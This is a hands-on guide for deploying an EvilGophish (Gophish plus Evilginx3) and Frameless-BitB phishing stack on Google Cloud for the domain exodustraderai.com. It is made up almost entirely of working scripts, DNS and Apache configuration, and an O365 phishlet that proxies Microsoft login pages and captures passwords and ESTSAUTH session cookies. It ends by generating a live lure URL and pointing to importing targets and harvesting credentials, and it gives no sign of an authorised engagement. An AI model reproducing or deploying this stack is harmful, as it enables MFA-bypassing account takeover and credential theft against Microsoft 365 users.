# EvilGophish + Frameless-BitB Setup Using Google Cloud Shell

**Domain**: exodustraderai.com
**External IP**: 34.173.185.6
**Deployment Method**: Google Cloud Shell (Browser-based)

This guide uses **Google Cloud Shell** exclusively - no local setup required. Everything runs in your browser.

---

## Table of Contents

1. [What is Google Cloud Shell](#what-is-google-cloud-shell)
2. [Prerequisites](#prerequisites)
3. [Access Cloud Shell](#access-cloud-shell)
4. [Enable Required APIs](#enable-required-apis)
5. [Create GCP Infrastructure](#create-gcp-infrastructure)
6. [Configure DNS Records](#configure-dns-records)
7. [Deploy EvilGophish Stack](#deploy-evilgophish-stack)
8. [Configure SSL Certificates](#configure-ssl-certificates)
9. [Setup Services](#setup-services)
10. [Verify Deployment](#verify-deployment)
11. [Access Dashboards](#access-dashboards)
12. [Troubleshooting](#troubleshooting)

---

## 1. What is Google Cloud Shell

Google Cloud Shell is a free, browser-based terminal that provides:
- Pre-installed gcloud CLI, kubectl, terraform, and 100+ tools
- 5GB of persistent storage in `$HOME`
- Built-in code editor
- Automatic authentication with your GCP account
- Temporary VM (resets after 20 minutes of inactivity)

**No installation required** - everything runs in your browser.

---

## 2. Prerequisites

### Required:
- Google Cloud Platform account with billing enabled
- Domain: **exodustraderai.com** registered
- Cloudflare account (for DNS management)
- GCP Project created

### Verify Project:
You should have a GCP project ready. Note your **Project ID** - you'll need it.

---

## 3. Access Cloud Shell

### 3.1 Open Cloud Shell

1. Go to: https://console.cloud.google.com
2. Login with your Google account
3. Select your GCP project from the dropdown at the top
4. Click the **Cloud Shell** icon (terminal icon) in the top-right corner

**Expected Result:** A terminal opens at the bottom of the screen.

### 3.2 Verify Cloud Shell Environment

Run these commands in Cloud Shell:

```bash
# Check you're authenticated
gcloud auth list

# Verify your project
gcloud config get-value project

# Check available tools
gcloud --version
```

**Expected Output:**
```
Credentialed Accounts:
ACTIVE  ACCOUNT
*       your-email@gmail.com

Your active configuration is: [cloudshell-12345]
project = your-project-id

Google Cloud SDK 456.0.0
```

### 3.3 Set Your Project ID

Replace `YOUR_PROJECT_ID` with your actual project ID:

```bash
export PROJECT_ID="YOUR_PROJECT_ID"
gcloud config set project $PROJECT_ID
```

**Verify:**
```bash
echo $PROJECT_ID
```

This should display your project ID.

---

## 4. Enable Required APIs

### 4.1 Enable APIs via Cloud Shell

```bash
gcloud services enable compute.googleapis.com
gcloud services enable dns.googleapis.com
gcloud services enable servicemanagement.googleapis.com
```

**Expected Output:**
```
Operation "operations/..." finished successfully.
```

### 4.2 Verify APIs are Enabled

```bash
gcloud services list --enabled | grep -E 'compute|dns'
```

**Expected Output:**
```
compute.googleapis.com         Compute Engine API
dns.googleapis.com             Cloud DNS API
```

---

## 5. Create GCP Infrastructure

### 5.1 Set Environment Variables

Set your deployment configuration:

```bash
export REGION="us-central1"
export ZONE="us-central1-c"
export VM_NAME="evilgophish-server"
export DOMAIN="exodustraderai.com"
export EXTERNAL_IP="34.173.185.6"
```

### 5.2 Create Static External IP

```bash
gcloud compute addresses create evilgophish-ip \
  --region=$REGION \
  --description="Static IP for EvilGophish server"
```

**Verify the IP address:**
```bash
gcloud compute addresses describe evilgophish-ip --region=$REGION
```

**Expected Output:**
```
address: 34.173.185.6
addressType: EXTERNAL
status: RESERVED
```

### 5.3 Create Firewall Rules

Create all firewall rules at once:

```bash
# Allow SSH
gcloud compute firewall-rules create evilgophish-allow-ssh \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:22 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow SSH access"

# Allow HTTP (for Let's Encrypt)
gcloud compute firewall-rules create evilgophish-allow-http \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:80 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow HTTP for SSL validation"

# Allow HTTPS
gcloud compute firewall-rules create evilgophish-allow-https \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:443 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow HTTPS for phishing"

# Allow DNS
gcloud compute firewall-rules create evilgophish-allow-dns \
  --direction=INGRESS \
  --priority=1000 \
  --network=default \
  --action=ALLOW \
  --rules=tcp:53,udp:53 \
  --source-ranges=0.0.0.0/0 \
  --target-tags=evilgophish \
  --description="Allow DNS for Evilginx3"
```

**Verify firewall rules:**
```bash
gcloud compute firewall-rules list --filter="name~evilgophish" --format="table(name,allowed[].map().firewall_rule().list(),targetTags.list())"
```

### 5.4 Create Startup Script

Create a startup script that will run when the VM boots:

```bash
cat > ~/startup-script.sh << 'EOFSCRIPT'
#!/bin/bash

# Update system
apt-get update
apt-get upgrade -y

# Install basic security
apt-get install -y fail2ban ufw

# Configure firewall
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 53
ufw --force enable

# Start fail2ban
systemctl enable fail2ban
systemctl start fail2ban

# Set hostname
hostnamectl set-hostname evilgophish-server

# Configure timezone
timedatectl set-timezone UTC

echo "Startup script completed at $(date)" >> /var/log/startup-script.log
EOFSCRIPT
```

### 5.5 Create VM Instance

```bash
gcloud compute instances create $VM_NAME \
  --zone=$ZONE \
  --machine-type=e2-standard-2 \
  --image-family=ubuntu-2404-lts-amd64 \
  --image-project=ubuntu-os-cloud \
  --boot-disk-size=50GB \
  --boot-disk-type=pd-standard \
  --tags=evilgophish \
  --address=evilgophish-ip \
  --metadata-from-file=startup-script=$HOME/startup-script.sh
```

**Expected Output:**
```
Created [https://www.googleapis.com/compute/v1/projects/PROJECT/zones/us-central1-c/instances/evilgophish-server].
NAME                 ZONE           MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP    STATUS
evilgophish-server   us-central1-c  e2-standard-2               10.x.x.x     34.173.185.6   RUNNING
```

### 5.6 Verify VM is Running

```bash
gcloud compute instances describe $VM_NAME --zone=$ZONE --format="get(status,networkInterfaces[0].accessConfigs[0].natIP)"
```

**Expected Output:**
```
RUNNING
34.173.185.6
```

---

## 6. Configure DNS Records

### 6.1 Required DNS Records

Login to **Cloudflare** (https://dash.cloudflare.com) and add these DNS records for **exodustraderai.com**:

| Type | Name | Content | TTL | Proxy Status |
|------|------|---------|-----|--------------|
| A | accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | login.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | account.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | www.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | sso.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |
| A | portal.accounts | 34.173.185.6 | Auto | DNS only (gray cloud) |

**CRITICAL**:
- Ensure "Proxy status" is **DNS only** (gray cloud icon)
- If it's orange (proxied), click it to disable proxy

### 6.2 Verify DNS from Cloud Shell

Wait 2-3 minutes after creating records, then test:

```bash
for subdomain in accounts login.accounts account.accounts www.accounts sso.accounts portal.accounts; do
  echo "Checking $subdomain.exodustraderai.com"
  nslookup $subdomain.exodustraderai.com 8.8.8.8 | grep -A1 "Name:"
  echo "---"
done
```

**Expected Output:** All should return `Address: 34.173.185.6`

---

## 7. Deploy EvilGophish Stack

### 7.1 Create Deployment Script in Cloud Shell

We'll create a comprehensive deployment script that runs on the VM:

```bash
cat > ~/evilgophish-deploy.sh << 'EOFDEPLOY'
#!/bin/bash
set -e

echo "=== EvilGophish Deployment Script ==="
echo "Started at: $(date)"

# Configuration
DOMAIN="exodustraderai.com"
EXTERNAL_IP="34.173.185.6"
INSTALL_DIR="/opt/security-testing/evilgophish"

# Update system
echo "[1/10] Updating system..."
apt-get update && apt-get upgrade -y

# Install dependencies
echo "[2/10] Installing dependencies..."
apt-get install -y git curl wget apache2 certbot python3-certbot-apache \
  build-essential net-tools dnsutils unzip jq sqlite3

# Install Go
echo "[3/10] Installing Go..."
GO_VERSION="1.23.3"
wget https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
echo 'export GOPATH=/root/go' >> /root/.bashrc
export PATH=$PATH:/usr/local/go/bin
export GOPATH=/root/go

# Verify Go installation
/usr/local/go/bin/go version

# Create directory structure
echo "[4/10] Creating directory structure..."
mkdir -p $INSTALL_DIR
cd $INSTALL_DIR

# Install Gophish
echo "[5/10] Installing Gophish..."
git clone https://github.com/gophish/gophish.git
cd gophish
/usr/local/go/bin/go build

# Configure Gophish
cat > config.json << 'EOFCONFIG'
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": false,
    "cert_path": "",
    "key_path": "",
    "trusted_origins": []
  },
  "phish_server": {
    "listen_url": "127.0.0.1:8080",
    "use_tls": false,
    "cert_path": "",
    "key_path": ""
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "admin@exodustraderai.com",
  "logging": {
    "filename": "",
    "level": "info"
  }
}
EOFCONFIG

# Install Evilginx3
echo "[6/10] Installing Evilginx3..."
cd $INSTALL_DIR
git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3
make

# Create phishlets directory
mkdir -p phishlets

# Install O365 phishlet
cat > phishlets/O365.yaml << 'EOFPHISHLET'
name: 'O365'
author: '@kgretzky'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing: false}

sub_filters:
  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {hostname: 'account.microsoftonline.com', sub: 'account', domain: 'microsoftonline.com', search: 'account.microsoftonline.com', replace: 'account.{domain}', mimes: ['text/html', 'application/json']}
  - {hostname: 'www.office.com', sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json']}
  - {hostname: 'login.live.com', sub: 'sso', domain: 'live.com', search: 'login.live.com', replace: 'sso.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {hostname: 'portal.microsoftonline.com', sub: 'portal', domain: 'microsoftonline.com', search: 'portal.microsoftonline.com', replace: 'portal.{domain}', mimes: ['text/html']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: '.login.live.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flogin%2Fcallback&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce={nonce}&state={state}'
EOFPHISHLET

# Install Frameless-BitB
echo "[7/10] Installing Frameless-BitB..."
cd $INSTALL_DIR
git clone https://github.com/mrd0x/Frameless-BitB.git

# Configure Apache
echo "[8/10] Configuring Apache..."
a2enmod ssl proxy proxy_http proxy_balancer lbmethod_byrequests headers rewrite

# Stop Apache for SSL cert generation
systemctl stop apache2

echo "[9/10] Deployment complete! Ready for SSL certificates."
echo "Completed at: $(date)"
EOFDEPLOY

chmod +x ~/evilgophish-deploy.sh
```

### 7.2 Upload and Execute Deployment Script

Upload the script to the VM and execute it:

```bash
# Copy script to VM
gcloud compute scp ~/evilgophish-deploy.sh $VM_NAME:/root/evilgophish-deploy.sh --zone=$ZONE

# Execute deployment script
gcloud compute ssh $VM_NAME --zone=$ZONE --command="sudo bash /root/evilgophish-deploy.sh"
```

**Expected Output:** The script will show progress through 9 steps.

**Approximate Time:** 5-7 minutes

---

## 8. Configure SSL Certificates

### 8.1 Generate SSL Certificates

Run this from Cloud Shell to generate Let's Encrypt certificates on the VM:

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
certbot certonly --standalone \
  --non-interactive \
  --agree-tos \
  --email admin@exodustraderai.com \
  -d accounts.exodustraderai.com \
  -d login.accounts.exodustraderai.com \
  -d account.accounts.exodustraderai.com \
  -d www.accounts.exodustraderai.com \
  -d sso.accounts.exodustraderai.com \
  -d portal.accounts.exodustraderai.com
'
```

**Expected Output:**
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem
```

**If you get errors:**
- Verify DNS records are resolving (Section 6.2)
- Ensure firewall allows port 80 (Section 5.3)
- Wait 5 minutes and try again

### 8.2 Verify Certificates

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='certbot certificates'
```

### 8.3 Setup Auto-Renewal

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
systemctl enable certbot.timer
systemctl start certbot.timer
systemctl status certbot.timer --no-pager
'
```

---

## 9. Setup Services

### 9.1 Create Configuration Script

Create a script to configure all services:

```bash
cat > ~/configure-services.sh << 'EOFSERVICES'
#!/bin/bash
set -e

echo "=== Configuring Services ==="

# Create Evilginx3 config directory
mkdir -p /root/.evilginx

# Create Evilginx3 config
cat > /root/.evilginx/config.yaml << 'EOF'
domain: exodustraderai.com
ipv4: 34.173.185.6
https_port: 8443
dns_port: 53
EOF

# Create Apache VirtualHost
cat > /etc/apache2/sites-available/accounts.exodustraderai.com.conf << 'EOFAPACHE'
<VirtualHost *:80>
    ServerName accounts.exodustraderai.com
    ServerAlias *.accounts.exodustraderai.com
    Redirect permanent / https://accounts.exodustraderai.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName accounts.exodustraderai.com
    ServerAlias *.accounts.exodustraderai.com

    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/accounts.exodustraderai.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/accounts.exodustraderai.com/privkey.pem

    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
    SSLHonorCipherOrder off
    SSLSessionTickets off

    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off

    Header always set Strict-Transport-Security "max-age=63072000"

    ErrorLog ${APACHE_LOG_DIR}/accounts.exodustraderai.com-error.log
    CustomLog ${APACHE_LOG_DIR}/accounts.exodustraderai.com-access.log combined

    ProxyPreserveHost On
    ProxyPass / https://127.0.0.1:8443/
    ProxyPassReverse / https://127.0.0.1:8443/
    ProxyTimeout 300
    ProxyBadHeader Ignore
</VirtualHost>
EOFAPACHE

# Enable Apache site
a2dissite 000-default.conf
a2ensite accounts.exodustraderai.com.conf
apache2ctl configtest

# Create Gophish systemd service
cat > /etc/systemd/system/gophish.service << 'EOFGOPHISH'
[Unit]
Description=Gophish Phishing Framework
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/security-testing/evilgophish/gophish
ExecStart=/opt/security-testing/evilgophish/gophish/gophish
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=gophish

[Install]
WantedBy=multi-user.target
EOFGOPHISH

# Create Evilginx3 systemd service
cat > /etc/systemd/system/evilginx3.service << 'EOFEVILGINX'
[Unit]
Description=Evilginx3 MITM Proxy
After=network.target gophish.service
Wants=network-online.target
Requires=gophish.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/security-testing/evilgophish/evilginx3
ExecStart=/opt/security-testing/evilgophish/evilginx3/evilginx3 -p /opt/security-testing/evilgophish/evilginx3/phishlets -g /opt/security-testing/evilgophish/gophish/gophish.db
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=evilginx3
NoNewPrivileges=false
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/root/.evilginx /opt/security-testing/evilgophish

[Install]
WantedBy=multi-user.target
EOFEVILGINX

# Reload systemd
systemctl daemon-reload

# Enable services
systemctl enable gophish
systemctl enable evilginx3
systemctl enable apache2

# Start services
systemctl start gophish
sleep 3
systemctl start apache2
sleep 3
systemctl start evilginx3

echo "=== Service Configuration Complete ==="
EOFSERVICES

chmod +x ~/configure-services.sh
```

### 9.2 Execute Service Configuration

```bash
# Upload configuration script
gcloud compute scp ~/configure-services.sh $VM_NAME:/root/configure-services.sh --zone=$ZONE

# Execute it
gcloud compute ssh $VM_NAME --zone=$ZONE --command="sudo bash /root/configure-services.sh"
```

### 9.3 Verify Services are Running

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
systemctl status gophish --no-pager
systemctl status evilginx3 --no-pager
systemctl status apache2 --no-pager
'
```

**Expected Output:** All three services should show `active (running)`

### 9.4 Check Ports

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='netstat -tulpn | grep -E ":53|:443|:3333|:8080|:8443"'
```

**Expected Output:**
```
tcp    0.0.0.0:443        apache2
tcp    127.0.0.1:3333     gophish
tcp    127.0.0.1:8080     gophish
tcp    127.0.0.1:8443     evilginx3
tcp    0.0.0.0:53         evilginx3
udp    0.0.0.0:53         evilginx3
```

---

## 10. Verify Deployment

### 10.1 Test HTTPS Access from Cloud Shell

```bash
curl -I https://accounts.exodustraderai.com
```

**Expected Output:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
```

### 10.2 Test All Subdomains

```bash
for subdomain in login.accounts account.accounts www.accounts sso.accounts portal.accounts; do
  echo "Testing $subdomain.exodustraderai.com"
  curl -I -k https://$subdomain.exodustraderai.com 2>&1 | head -3
  echo "---"
done
```

### 10.3 Check Service Logs

```bash
# Gophish logs
gcloud compute ssh $VM_NAME --zone=$ZONE --command='journalctl -u gophish -n 20 --no-pager'

# Evilginx3 logs
gcloud compute ssh $VM_NAME --zone=$ZONE --command='journalctl -u evilginx3 -n 20 --no-pager'

# Apache logs
gcloud compute ssh $VM_NAME --zone=$ZONE --command='tail -20 /var/log/apache2/accounts.exodustraderai.com-error.log'
```

---

## 11. Access Dashboards

### 11.1 Get Gophish Initial Password

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='journalctl -u gophish --no-pager | grep "Please login with"'
```

**Expected Output:**
```
Please login with the username admin and the password AbC123XyZ
```

Save this password!

### 11.2 Setup SSH Tunnel from Cloud Shell

Cloud Shell can create SSH tunnels to access internal services:

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE -- -L 3333:127.0.0.1:3333 -N
```

**This command will hang** - that's normal. It keeps the tunnel open.

### 11.3 Access Gophish Dashboard via Web Preview

While the SSH tunnel is running:

1. In Cloud Shell, click **Web Preview** (top-right, next to settings gear)
2. Click **Change Port**
3. Enter port: **3333**
4. Click **Change and Preview**

**OR** manually construct the URL:
```
https://3333-cs-PROJECT_ID-default.cloudshell.dev
```

Login:
- Username: `admin`
- Password: (from step 11.1)

### 11.4 Access Evilginx3 Console

Open a new Cloud Shell tab (click `+` icon), then:

```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
cd /opt/security-testing/evilgophish/evilginx3
./evilginx3 -p phishlets -g /opt/security-testing/evilgophish/gophish/gophish.db
'
```

This opens an interactive Evilginx3 console.

---

## 12. Configure Evilginx3 Phishlet

### 12.1 In Evilginx3 Console

Once in the Evilginx3 console (from step 11.4), run these commands:

```
config domain exodustraderai.com
config ipv4 external 34.173.185.6
config ipv4 bind 0.0.0.0
config https_port 8443
config dns_port 53
phishlets hostname O365 accounts.exodustraderai.com
phishlets enable O365
```

### 12.2 Create Phishing Lure

```
lures create O365
lures get-url 0
```

**Expected Output:**
```
https://accounts.exodustraderai.com/AbC123
```

This is your phishing URL!

### 12.3 Test Phishing URL

Open the URL in a browser - you should see a Microsoft Office 365 login page.

---

## 13. Troubleshooting

### 13.1 Cloud Shell Session Timeout

If your Cloud Shell session times out (20 min inactivity):

1. Refresh the page
2. Re-run: `export VM_NAME="evilgophish-server"` and `export ZONE="us-central1-c"`
3. Continue where you left off

### 13.2 Services Not Running

Check service status:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
systemctl status gophish --no-pager
systemctl status evilginx3 --no-pager
systemctl status apache2 --no-pager
'
```

Restart if needed:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
systemctl restart gophish
systemctl restart evilginx3
systemctl restart apache2
'
```

### 13.3 SSL Certificate Errors

Check certificate:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='certbot certificates'
```

Renew if needed:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
systemctl stop apache2
certbot renew --force-renewal
systemctl start apache2
systemctl restart evilginx3
'
```

### 13.4 Port Already in Use

Find what's using ports:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE --command='
lsof -i :443
lsof -i :8443
lsof -i :53
'
```

### 13.5 DNS Not Resolving

Verify from Cloud Shell:
```bash
nslookup login.accounts.exodustraderai.com 8.8.8.8
```

If not resolving:
- Check Cloudflare DNS records (Section 6.1)
- Ensure proxy is OFF (gray cloud)
- Wait 5-10 minutes for DNS propagation

### 13.6 Can't Access Gophish Dashboard

Check SSH tunnel is running:
```bash
ps aux | grep "ssh.*3333"
```

Recreate tunnel:
```bash
gcloud compute ssh $VM_NAME --zone=$ZONE -- -L 3333:127.0.0.1:3333 -N
```

### 13.7 VM Connection Issues

List instances:
```bash
gcloud compute instances list
```

Verify VM is running:
```bash
gcloud compute instances describe $VM_NAME --zone=$ZONE | grep status
```

Start if stopped:
```bash
gcloud compute instances start $VM_NAME --zone=$ZONE
```

---

## 14. Complete Deployment Checklist

- [ ] Cloud Shell opened and authenticated
- [ ] Project ID set
- [ ] APIs enabled (Compute, DNS)
- [ ] Static IP created (34.173.185.6)
- [ ] Firewall rules created (SSH, HTTP, HTTPS, DNS)
- [ ] VM instance created and running
- [ ] DNS records created in Cloudflare (6 A records)
- [ ] DNS propagation verified
- [ ] Deployment script executed successfully
- [ ] SSL certificates generated
- [ ] Services configured and running
- [ ] External HTTPS access verified
- [ ] Gophish dashboard accessible
- [ ] Evilginx3 console accessible
- [ ] O365 phishlet enabled
- [ ] Phishing lure URL generated and tested

---

## 15. Quick Reference Commands

### SSH into VM
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c
```

### Check Service Status
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c --command='systemctl status gophish evilginx3 apache2 --no-pager'
```

### View Logs
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c --command='journalctl -u evilginx3 -n 50 --no-pager'
```

### Restart All Services
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c --command='systemctl restart gophish evilginx3 apache2'
```

### Create SSH Tunnel for Gophish
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-c -- -L 3333:127.0.0.1:3333 -N
```

### Stop VM (to save costs)
```bash
gcloud compute instances stop evilgophish-server --zone=us-central1-c
```

### Start VM
```bash
gcloud compute instances start evilgophish-server --zone=us-central1-c
```

### Delete Everything (cleanup)
```bash
# Delete VM
gcloud compute instances delete evilgophish-server --zone=us-central1-c --quiet

# Delete IP
gcloud compute addresses delete evilgophish-ip --region=us-central1 --quiet

# Delete firewall rules
gcloud compute firewall-rules delete evilgophish-allow-ssh --quiet
gcloud compute firewall-rules delete evilgophish-allow-http --quiet
gcloud compute firewall-rules delete evilgophish-allow-https --quiet
gcloud compute firewall-rules delete evilgophish-allow-dns --quiet
```

---

## 16. Cost Management

### Estimated Costs:
- **e2-standard-2 VM**: ~$50/month (730 hours)
- **50GB Standard Disk**: ~$2/month
- **Static IP**: ~$7/month (while VM is running)
- **Total**: ~$60/month

### Save Money:
1. **Stop VM when not in use**:
   ```bash
   gcloud compute instances stop evilgophish-server --zone=us-central1-c
   ```

2. **Set up billing alerts**:
   - Go to: https://console.cloud.google.com/billing
   - Set budget alerts at $25, $50, $75

3. **Use preemptible instances** (for testing only):
   - Add `--preemptible` flag when creating VM
   - Saves 60-91% but VM can be terminated anytime

---

## Summary

You now have a complete EvilGophish + Frameless-BitB deployment managed entirely from **Google Cloud Shell**:

✅ **Infrastructure**: GCP VM with firewall rules
✅ **Services**: Gophish, Evilginx3, Apache
✅ **SSL**: Let's Encrypt certificates for all subdomains
✅ **Access**: SSH tunnels for dashboards
✅ **Phishing**: O365 phishlet ready to use

**Everything was done from your browser - no local tools required.**

**Next Steps:**
1. Access Gophish dashboard (Section 11)
2. Create email templates
3. Import target lists
4. Create campaigns
5. Monitor captured credentials in Evilginx3
